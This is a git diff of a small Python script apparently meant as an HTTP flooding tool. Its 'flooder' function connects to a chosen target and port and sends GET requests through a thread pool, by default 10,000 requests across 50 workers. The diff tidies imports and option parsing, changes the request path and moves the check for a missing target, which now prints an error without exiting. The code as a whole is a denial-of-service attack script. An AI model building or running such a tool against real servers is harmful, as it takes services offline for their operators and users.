@@ -1,7 +1,4 @@
-import socket, sys, getopt, concurrent.futures, threading
-
-from random import sample
-from string import digits, ascii_letters
+import socket, sys, getopt, concurrent.futures
 
 def flooder(target, port):
     try:
@@ -21,23 +18,20 @@ def flooder(target, port):
 
     else:
         s.connect((address, port))
-        s.send(b'GET /123 HTTP/1.1\r\n')
+        s.send(b'GET / HTTP/1.1\r\n')
         print('Sent request to %s' % str(address))
-
 def main(argv):
     opts, args = getopt.getopt(argv,'ht:p:w:r:',['target=','port=','workers=','range='])
 
-    if '-t' not in opts:
-        print('You have to select a target with flag -t')
-        sys.exit()
-
     #default values
+    target = None
     port = 80
     workers = 50
     num_of_req = 10000
 
+    #define options
     for opt, arg in opts:
-        if opt == '-h':
+        if '-h' in opt:
             print('Usage: python3 main.py -t <target_without_http://> '
                   '-p <port> -w <number_of_workers> -r <number_of requests>')
             sys.exit()
@@ -49,6 +43,9 @@ def main(argv):
             workers = int(arg)
         elif opt in ('-r', '--range'):
             num_of_req = int(arg)
+
+    if not target:
+        print('You have to select a target with flag -t')
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
         for _ in range(num_of_req):
